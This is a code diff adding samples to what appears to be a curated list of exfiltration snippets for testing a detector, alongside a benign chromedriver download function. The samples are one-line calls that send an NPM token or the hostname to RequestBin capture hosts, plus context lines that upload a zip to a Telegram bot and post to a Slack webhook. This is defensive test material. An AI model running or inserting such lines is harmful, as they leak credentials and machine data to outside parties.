@@ -298,6 +298,12 @@ EXFIL_REASONS = ("sends data to a Telegram bot whose token is written in the cod
                  "sends the machine's public IP address to a data-capture service", "runs a cryptocurrency miner",
                  "rewrites browser shortcuts to load an extension")
 EXFIL_CURATED = [
+    # RequestBin by its host names only: requestBinary() is chromedriver's download function
+    "function requestBinary(o, p) { return request(o).pipe(fs.createWriteStream(p)); }\n"
+    "requestBinary(getRequestOptions(), f);\n",
+    "https.get('https://enx1.x.requestbin.net/r/abc?d=' + process.env.NPM_TOKEN);\n",
+    "requests.post('https://requestb.in/abc', data=socket.gethostname())\n",
+    "const u = 'requestbin.io/requestBin'; fetch(u + os.hostname());\n",
     "import requests\nTOKEN = '" + _TG + "'\ndef go():\n    requests.post(f'https://api.telegram.org/bot{TOKEN}"
     "/sendDocument', files={'document': open('w.zip', 'rb')})\n",
     "const url = 'https://" + _SLACK + "';\nfetch(url, { method: 'POST', body: JSON.stringify({ text: 'hi' }) });\n",
